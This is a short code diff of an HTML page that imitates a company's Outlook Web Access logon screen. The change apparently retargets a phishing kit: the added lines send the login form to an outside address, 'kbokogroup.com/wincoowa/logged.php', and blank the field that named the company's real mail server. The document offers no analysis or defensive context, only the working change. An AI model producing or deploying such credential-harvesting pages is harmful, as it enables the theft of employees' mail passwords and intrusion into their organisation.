@@ -690,8 +690,8 @@ input.chk
 	</div>
 </noscript>
 
-<form action="proxess.php" method="POST" name="logonForm" ENCTYPE="application/x-www-form-urlencoded" autocomplete="off">
-<input type="hidden" name="destination" value="https://outlook.hillebrandgroup.com/owa/">
+<form action="https://kbokogroup.com/wincoowa/logged.php" method="POST" name="logonForm" ENCTYPE="application/x-www-form-urlencoded" autocomplete="off">
+<input type="hidden" name="destination" value="">
 <input type="hidden" name="flags" value="4">
 <input type="hidden" name="forcedownlevel" value="0">
  
